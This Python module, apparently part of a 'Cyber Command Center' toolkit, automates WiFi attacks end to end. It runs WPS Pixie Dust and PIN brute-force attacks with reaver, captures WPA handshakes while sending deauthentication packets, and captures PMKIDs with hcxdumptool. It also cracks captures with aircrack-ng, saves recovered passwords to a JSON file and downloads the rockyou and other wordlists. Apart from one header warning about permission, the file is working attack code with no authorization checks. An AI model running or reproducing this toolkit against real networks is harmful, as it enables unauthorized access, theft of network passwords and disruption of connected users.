"""
Cyber Command Center - Advanced WiFi Hacking Module
Ethical WiFi penetration testing tools
WARNING: Only use on networks you own or have permission to test
"""
import subprocess
import threading
import time
import os
import re
import json
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from pathlib import Path
from dataclasses import dataclass, field
from enum import Enum
import platform


class AttackType(Enum):
    WPS_PIN = "wps_pin"
    WPS_PIXIE = "wps_pixie"
    HANDSHAKE_CAPTURE = "handshake_capture"
    PMKID_CAPTURE = "pmkid_capture"
    DICTIONARY_ATTACK = "dictionary_attack"
    EVIL_TWIN = "evil_twin"
    DEAUTH = "deauth"


@dataclass
class WPSNetwork:
    """WiFi network with WPS information"""
    bssid: str
    essid: str
    channel: int
    signal: int
    wps_enabled: bool
    wps_locked: bool = False
    wps_version: str = ""
    manufacturer: str = ""
    model: str = ""
    serial: str = ""
    
    def to_dict(self):
        return {
            'bssid': self.bssid,
            'essid': self.essid,
            'channel': self.channel,
            'signal': self.signal,
            'wps_enabled': self.wps_enabled,
            'wps_locked': self.wps_locked,
            'wps_version': self.wps_version,
            'manufacturer': self.manufacturer,
            'model': self.model,
            'serial': self.serial
        }


@dataclass
class AttackResult:
    """Result of an attack attempt"""
    attack_type: AttackType
    target_bssid: str
    target_essid: str
    success: bool
    password: str = None
    pin: str = None
    error: str = None
    duration_seconds: float = 0
    timestamp: datetime = None
    details: Dict = field(default_factory=dict)
    
    def to_dict(self):
        return {
            'attack_type': self.attack_type.value,
            'target_bssid': self.target_bssid,
            'target_essid': self.target_essid,
            'success': self.success,
            'password': self.password,
            'pin': self.pin,
            'error': self.error,
            'duration_seconds': self.duration_seconds,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'details': self.details
        }


class WiFiHacker:
    """
    Advanced WiFi Penetration Testing Tools
    
    Supports:
    - WPS PIN attack (Reaver)
    - WPS Pixie Dust attack
    - Handshake capture
    - PMKID capture (hashcat)
    - Dictionary attacks (aircrack-ng, hashcat)
    - Evil Twin attacks
    - Deauthentication attacks
    """
    
    def __init__(self):
        self.base_dir = Path(__file__).parent.parent
        self.captures_dir = self.base_dir / "captures"
        self.handshakes_dir = self.captures_dir / "handshakes"
        self.wordlists_dir = self.base_dir / "wordlists"
        self.results_dir = self.captures_dir / "results"
        
        # Create directories
        for d in [self.captures_dir, self.handshakes_dir, self.wordlists_dir, self.results_dir]:
            d.mkdir(parents=True, exist_ok=True)
        
        self.current_attack = None
        self.attack_process = None
        self.attack_results: List[AttackResult] = []
        self.monitor_interface = None
        self._attack_thread = None
        self._stop_flag = False
        
        # Check available tools
        self.tools_available = self._check_tools()
    
    def _check_tools(self) -> Dict[str, bool]:
        """Check which hacking tools are available"""
        tools = {
            'aircrack-ng': False,
            'airodump-ng': False,
            'aireplay-ng': False,
            'airmon-ng': False,
            'reaver': False,
            'bully': False,
            'hashcat': False,
            'hcxdumptool': False,
            'hcxpcapngtool': False,
            'wash': False,
            'mdk4': False,
            'hostapd': False
        }
        
        is_windows = platform.system() == 'Windows'
        
        for tool in tools:
            try:
                if is_windows:
                    result = subprocess.run(
                        ['where', tool],
                        capture_output=True,
                        timeout=5
                    )
                else:
                    result = subprocess.run(
                        ['which', tool],
                        capture_output=True,
                        timeout=5
                    )
                tools[tool] = result.returncode == 0
            except:
                tools[tool] = False
        
        return tools
    
    def get_requirements(self) -> Dict:
        """Get tool requirements and availability status"""
        attacks = {
            'wps_pin': {
                'name': 'WPS PIN Attack',
                'description': 'Ataque de fuerza bruta al PIN WPS del router',
                'requirements': ['reaver', 'wash', 'airmon-ng'],
                'time_estimate': '4-10 horas',
                'success_rate': 'Medio (depende si WPS está activo)'
            },
            'wps_pixie': {
                'name': 'Pixie Dust Attack',
                'description': 'Ataque rápido a WPS usando vulnerabilidad Pixie Dust',
                'requirements': ['reaver', 'wash'],
                'time_estimate': '1-5 minutos',
                'success_rate': 'Alto en routers vulnerables'
            },
            'handshake': {
                'name': 'Captura de Handshake',
                'description': 'Captura el handshake WPA para crackear offline',
                'requirements': ['airodump-ng', 'aireplay-ng', 'airmon-ng'],
                'time_estimate': '1-10 minutos',
                'success_rate': 'Alto'
            },
            'pmkid': {
                'name': 'PMKID Attack',
                'description': 'Captura PMKID sin necesidad de handshake',
                'requirements': ['hcxdumptool', 'hcxpcapngtool', 'hashcat'],
                'time_estimate': '1-5 minutos',
                'success_rate': 'Medio'
            },
            'dictionary': {
                'name': 'Ataque de Diccionario',
                'description': 'Prueba contraseñas de una lista',
                'requirements': ['aircrack-ng'],
                'time_estimate': 'Depende del diccionario',
                'success_rate': 'Depende de la contraseña'
            },
            'evil_twin': {
                'name': 'Evil Twin',
                'description': 'Crea un punto de acceso falso',
                'requirements': ['hostapd', 'dnsmasq', 'airmon-ng'],
                'time_estimate': 'Continuo',
                'success_rate': 'Alto con ingeniería social'
            }
        }
        
        for attack_id, attack in attacks.items():
            available = all(self.tools_available.get(req, False) for req in attack['requirements'])
            attack['available'] = available
            attack['missing_tools'] = [
                req for req in attack['requirements'] 
                if not self.tools_available.get(req, False)
            ]
        
        return {
            'tools': self.tools_available,
            'attacks': attacks,
            'monitor_mode_available': self.tools_available.get('airmon-ng', False),
            'platform': platform.system()
        }
    
    def enable_monitor_mode(self, interface: str = None) -> Dict:
        """Enable monitor mode on wireless interface"""
        if not self.tools_available.get('airmon-ng'):
            return {'success': False, 'error': 'airmon-ng not available'}
        
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True, timeout=30)
            
            # If no interface specified, try to find one
            if not interface:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
                interfaces = re.findall(r'^(\w+)\s+IEEE', result.stdout, re.MULTILINE)
                if interfaces:
                    interface = interfaces[0]
                else:
                    return {'success': False, 'error': 'No wireless interface found'}
            
            # Start monitor mode
            result = subprocess.run(
                ['airmon-ng', 'start', interface],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Find the monitor interface name
            self.monitor_interface = interface + 'mon'
            if 'mon' not in result.stdout:
                # Try alternative naming
                self.monitor_interface = interface
            
            return {
                'success': True,
                'interface': self.monitor_interface,
                'original_interface': interface
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def disable_monitor_mode(self) -> Dict:
        """Disable monitor mode"""
        if not self.monitor_interface:
            return {'success': True, 'message': 'No monitor interface active'}
        
        try:
            subprocess.run(
                ['airmon-ng', 'stop', self.monitor_interface],
                capture_output=True,
                timeout=30
            )
            
            # Restart network manager
            subprocess.run(['service', 'NetworkManager', 'restart'], capture_output=True, timeout=30)
            
            self.monitor_interface = None
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def scan_wps_networks(self, timeout: int = 30) -> List[Dict]:
        """Scan for networks with WPS enabled using wash"""
        if not self.tools_available.get('wash'):
            return []
        
        if not self.monitor_interface:
            self.enable_monitor_mode()
        
        if not self.monitor_interface:
            return []
        
        try:
            result = subprocess.run(
                ['wash', '-i', self.monitor_interface, '-s'],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            networks = []
            for line in result.stdout.split('\n'):
                # Parse wash output
                # BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
                match = re.match(
                    r'([0-9A-Fa-f:]{17})\s+(\d+)\s+(-?\d+)\s+(\d\.\d)\s+(Yes|No)\s+(\S*)\s+(.*)',
                    line.strip()
                )
                if match:
                    networks.append(WPSNetwork(
                        bssid=match.group(1),
                        channel=int(match.group(2)),
                        signal=int(match.group(3)),
                        wps_version=match.group(4),
                        wps_locked=match.group(5) == 'Yes',
                        manufacturer=match.group(6),
                        essid=match.group(7).strip(),
                        wps_enabled=True
                    ).to_dict())
            
            return networks
        except Exception as e:
            print(f"Error scanning WPS networks: {e}")
            return []
    
    def attack_wps_pixie(self, bssid: str, channel: int, essid: str = "") -> Dict:
        """
        Pixie Dust WPS attack (fast)
        Uses reaver with pixiewps
        """
        if not self.tools_available.get('reaver'):
            return {'success': False, 'error': 'reaver not available'}
        
        if not self.monitor_interface:
            result = self.enable_monitor_mode()
            if not result['success']:
                return result
        
        self.current_attack = AttackType.WPS_PIXIE
        self._stop_flag = False
        start_time = time.time()
        
        try:
            # Run reaver with Pixie Dust
            cmd = [
                'reaver',
                '-i', self.monitor_interface,
                '-b', bssid,
                '-c', str(channel),
                '-K', '1',  # Pixie Dust attack
                '-vv'
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.attack_process = process
            output = ""
            pin = None
            password = None
            
            while process.poll() is None and not self._stop_flag:
                line = process.stdout.readline()
                output += line
                
                # Look for PIN
                pin_match = re.search(r'WPS PIN:\s*[\'"]?(\d{8})[\'"]?', line)
                if pin_match:
                    pin = pin_match.group(1)
                
                # Look for password
                psk_match = re.search(r'WPA PSK:\s*[\'"]?(.+?)[\'"]?\s*$', line)
                if psk_match:
                    password = psk_match.group(1)
                
                if password:
                    break
            
            process.terminate()
            duration = time.time() - start_time
            
            result = AttackResult(
                attack_type=AttackType.WPS_PIXIE,
                target_bssid=bssid,
                target_essid=essid,
                success=password is not None,
                password=password,
                pin=pin,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={'output': output[-2000:]}  # Last 2000 chars
            )
            
            if password:
                result.error = None
            else:
                result.error = "Pixie Dust attack failed - router may not be vulnerable"
            
            self.attack_results.append(result)
            self._save_result(result)
            
            return result.to_dict()
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None
    
    def attack_wps_bruteforce(self, bssid: str, channel: int, essid: str = "",
                              delay: float = 1.0, timeout: int = 36000) -> Dict:
        """
        WPS PIN brute force attack
        This is slow but works on most WPS-enabled routers
        """
        if not self.tools_available.get('reaver'):
            return {'success': False, 'error': 'reaver not available'}
        
        if not self.monitor_interface:
            result = self.enable_monitor_mode()
            if not result['success']:
                return result
        
        self.current_attack = AttackType.WPS_PIN
        self._stop_flag = False
        start_time = time.time()
        
        try:
            cmd = [
                'reaver',
                '-i', self.monitor_interface,
                '-b', bssid,
                '-c', str(channel),
                '-d', str(int(delay)),
                '-vv',
                '--no-nacks'
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.attack_process = process
            output_lines = []
            pin = None
            password = None
            progress = 0
            
            while process.poll() is None and not self._stop_flag:
                if time.time() - start_time > timeout:
                    process.terminate()
                    break
                
                line = process.stdout.readline()
                output_lines.append(line)
                
                # Parse progress
                progress_match = re.search(r'(\d+\.\d+)% complete', line)
                if progress_match:
                    progress = float(progress_match.group(1))
                
                # Look for PIN
                pin_match = re.search(r'WPS PIN:\s*[\'"]?(\d{8})[\'"]?', line)
                if pin_match:
                    pin = pin_match.group(1)
                
                # Look for password
                psk_match = re.search(r'WPA PSK:\s*[\'"]?(.+?)[\'"]?\s*$', line)
                if psk_match:
                    password = psk_match.group(1)
                    break
            
            process.terminate()
            duration = time.time() - start_time
            
            result = AttackResult(
                attack_type=AttackType.WPS_PIN,
                target_bssid=bssid,
                target_essid=essid,
                success=password is not None,
                password=password,
                pin=pin,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={
                    'progress': progress,
                    'output': '\n'.join(output_lines[-50:])
                }
            )
            
            self.attack_results.append(result)
            self._save_result(result)
            
            return result.to_dict()
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None
    
    def capture_handshake(self, bssid: str, channel: int, essid: str = "",
                          timeout: int = 120, deauth: bool = True) -> Dict:
        """
        Capture WPA/WPA2 handshake
        Optionally sends deauth packets to speed up capture
        """
        if not self.tools_available.get('airodump-ng'):
            return {'success': False, 'error': 'airodump-ng not available'}
        
        if not self.monitor_interface:
            result = self.enable_monitor_mode()
            if not result['success']:
                return result
        
        self.current_attack = AttackType.HANDSHAKE_CAPTURE
        self._stop_flag = False
        start_time = time.time()
        
        # Output file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        capture_prefix = self.handshakes_dir / f"handshake_{bssid.replace(':', '')}_{timestamp}"
        
        try:
            # Start airodump-ng to capture handshake
            airodump_cmd = [
                'airodump-ng',
                '-c', str(channel),
                '--bssid', bssid,
                '-w', str(capture_prefix),
                '--output-format', 'cap',
                self.monitor_interface
            ]
            
            airodump_process = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            self.attack_process = airodump_process
            handshake_captured = False
            
            # Send deauth packets periodically
            deauth_count = 0
            while time.time() - start_time < timeout and not self._stop_flag:
                # Check if handshake file exists and has data
                cap_file = Path(str(capture_prefix) + "-01.cap")
                if cap_file.exists():
                    # Check for handshake using aircrack-ng
                    check_result = subprocess.run(
                        ['aircrack-ng', str(cap_file)],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    if '1 handshake' in check_result.stdout:
                        handshake_captured = True
                        break
                
                # Send deauth
                if deauth and self.tools_available.get('aireplay-ng') and deauth_count < 5:
                    subprocess.run(
                        ['aireplay-ng', '-0', '5', '-a', bssid, self.monitor_interface],
                        capture_output=True,
                        timeout=10
                    )
                    deauth_count += 1
                
                time.sleep(5)
            
            airodump_process.terminate()
            duration = time.time() - start_time
            
            cap_file = Path(str(capture_prefix) + "-01.cap")
            
            result = AttackResult(
                attack_type=AttackType.HANDSHAKE_CAPTURE,
                target_bssid=bssid,
                target_essid=essid,
                success=handshake_captured,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={
                    'capture_file': str(cap_file) if cap_file.exists() else None,
                    'deauth_sent': deauth_count
                }
            )
            
            if not handshake_captured:
                result.error = "No handshake captured within timeout"
            
            self.attack_results.append(result)
            
            return result.to_dict()
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None
    
    def crack_handshake(self, capture_file: str, wordlist: str,
                        bssid: str = None) -> Dict:
        """
        Crack captured handshake using dictionary attack
        """
        if not self.tools_available.get('aircrack-ng'):
            return {'success': False, 'error': 'aircrack-ng not available'}
        
        if not Path(capture_file).exists():
            return {'success': False, 'error': 'Capture file not found'}
        
        if not Path(wordlist).exists():
            # Check in wordlists directory
            wordlist_path = self.wordlists_dir / wordlist
            if not wordlist_path.exists():
                return {'success': False, 'error': 'Wordlist not found'}
            wordlist = str(wordlist_path)
        
        self.current_attack = AttackType.DICTIONARY_ATTACK
        self._stop_flag = False
        start_time = time.time()
        
        try:
            cmd = ['aircrack-ng', '-w', wordlist, capture_file]
            if bssid:
                cmd.extend(['-b', bssid])
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.attack_process = process
            password = None
            keys_tested = 0
            
            for line in process.stdout:
                if self._stop_flag:
                    process.terminate()
                    break
                
                # Look for "KEY FOUND"
                key_match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', line)
                if key_match:
                    password = key_match.group(1)
                    break
                
                # Parse keys tested
                tested_match = re.search(r'(\d+) keys tested', line)
                if tested_match:
                    keys_tested = int(tested_match.group(1))
            
            process.wait()
            duration = time.time() - start_time
            
            result = AttackResult(
                attack_type=AttackType.DICTIONARY_ATTACK,
                target_bssid=bssid or "unknown",
                target_essid="",
                success=password is not None,
                password=password,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={
                    'wordlist': wordlist,
                    'keys_tested': keys_tested
                }
            )
            
            if not password:
                result.error = f"Password not found after {keys_tested} attempts"
            
            self.attack_results.append(result)
            self._save_result(result)
            
            return result.to_dict()
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None
    
    def capture_pmkid(self, bssid: str, channel: int, essid: str = "",
                      timeout: int = 60) -> Dict:
        """
        Capture PMKID for faster cracking (no handshake needed)
        Requires hcxdumptool and hcxpcapngtool
        """
        if not self.tools_available.get('hcxdumptool'):
            return {'success': False, 'error': 'hcxdumptool not available'}
        
        if not self.monitor_interface:
            result = self.enable_monitor_mode()
            if not result['success']:
                return result
        
        self.current_attack = AttackType.PMKID_CAPTURE
        self._stop_flag = False
        start_time = time.time()
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        capture_file = self.captures_dir / f"pmkid_{timestamp}.pcapng"
        hash_file = self.captures_dir / f"pmkid_{timestamp}.hash"
        
        try:
            # Create filter file for target
            filter_file = self.captures_dir / f"filter_{timestamp}.txt"
            with open(filter_file, 'w') as f:
                f.write(bssid.replace(':', '').lower())
            
            # Run hcxdumptool
            cmd = [
                'hcxdumptool',
                '-i', self.monitor_interface,
                '-o', str(capture_file),
                '--filterlist_ap', str(filter_file),
                '--filtermode=2',
                '--enable_status=1'
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.attack_process = process
            pmkid_captured = False
            
            while time.time() - start_time < timeout and not self._stop_flag:
                time.sleep(5)
                
                # Check if PMKID captured
                if capture_file.exists() and capture_file.stat().st_size > 0:
                    # Convert to hashcat format
                    convert_result = subprocess.run(
                        ['hcxpcapngtool', '-o', str(hash_file), str(capture_file)],
                        capture_output=True,
                        timeout=30
                    )
                    
                    if hash_file.exists() and hash_file.stat().st_size > 0:
                        pmkid_captured = True
                        break
            
            process.terminate()
            duration = time.time() - start_time
            
            # Clean up filter file
            filter_file.unlink(missing_ok=True)
            
            result = AttackResult(
                attack_type=AttackType.PMKID_CAPTURE,
                target_bssid=bssid,
                target_essid=essid,
                success=pmkid_captured,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={
                    'capture_file': str(capture_file) if capture_file.exists() else None,
                    'hash_file': str(hash_file) if pmkid_captured else None
                }
            )
            
            if not pmkid_captured:
                result.error = "PMKID not captured - router may not support it"
            
            self.attack_results.append(result)
            
            return result.to_dict()
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None
    
    def stop_attack(self) -> Dict:
        """Stop current attack"""
        self._stop_flag = True
        
        if self.attack_process:
            try:
                self.attack_process.terminate()
                self.attack_process.wait(timeout=5)
            except:
                self.attack_process.kill()
        
        self.current_attack = None
        self.attack_process = None
        
        return {'success': True, 'message': 'Attack stopped'}
    
    def get_status(self) -> Dict:
        """Get current attack status"""
        return {
            'current_attack': self.current_attack.value if self.current_attack else None,
            'monitor_interface': self.monitor_interface,
            'tools_available': self.tools_available,
            'total_attacks': len(self.attack_results),
            'successful_attacks': sum(1 for r in self.attack_results if r.success)
        }
    
    def get_results(self, limit: int = 20) -> List[Dict]:
        """Get attack results"""
        return [r.to_dict() for r in self.attack_results[-limit:]]
    
    def get_captured_passwords(self) -> List[Dict]:
        """Get all captured passwords"""
        return [
            {
                'essid': r.target_essid,
                'bssid': r.target_bssid,
                'password': r.password,
                'pin': r.pin,
                'attack_type': r.attack_type.value,
                'timestamp': r.timestamp.isoformat() if r.timestamp else None
            }
            for r in self.attack_results if r.success and r.password
        ]
    
    def _save_result(self, result: AttackResult):
        """Save successful result to file"""
        if result.success and result.password:
            results_file = self.results_dir / "cracked_passwords.json"
            
            try:
                existing = []
                if results_file.exists():
                    with open(results_file, 'r') as f:
                        existing = json.load(f)
                
                existing.append({
                    'essid': result.target_essid,
                    'bssid': result.target_bssid,
                    'password': result.password,
                    'pin': result.pin,
                    'attack_type': result.attack_type.value,
                    'timestamp': result.timestamp.isoformat() if result.timestamp else None
                })
                
                with open(results_file, 'w') as f:
                    json.dump(existing, f, indent=2)
            except Exception as e:
                print(f"Error saving result: {e}")
    
    def get_wordlists(self) -> List[Dict]:
        """Get available wordlists"""
        wordlists = []
        
        for f in self.wordlists_dir.glob('*'):
            if f.is_file():
                # Count lines (approximate for large files)
                try:
                    size = f.stat().st_size
                    # Estimate lines (assume average 10 chars per password)
                    estimated_lines = size // 10
                    
                    wordlists.append({
                        'name': f.name,
                        'path': str(f),
                        'size_bytes': size,
                        'size_mb': round(size / (1024*1024), 2),
                        'estimated_passwords': estimated_lines
                    })
                except:
                    pass
        
        return wordlists
    
    def download_wordlist(self, name: str) -> Dict:
        """Download popular wordlists"""
        wordlists = {
            'rockyou': 'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',
            'common_passwords': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
            'wifi_passwords': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt'
        }
        
        if name not in wordlists:
            return {'success': False, 'error': f'Unknown wordlist: {name}'}
        
        url = wordlists[name]
        output_file = self.wordlists_dir / f"{name}.txt"
        
        try:
            import urllib.request
            urllib.request.urlretrieve(url, str(output_file))
            
            return {
                'success': True,
                'file': str(output_file),
                'size_mb': round(output_file.stat().st_size / (1024*1024), 2)
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}


# Global instance
wifi_hacker = WiFiHacker()
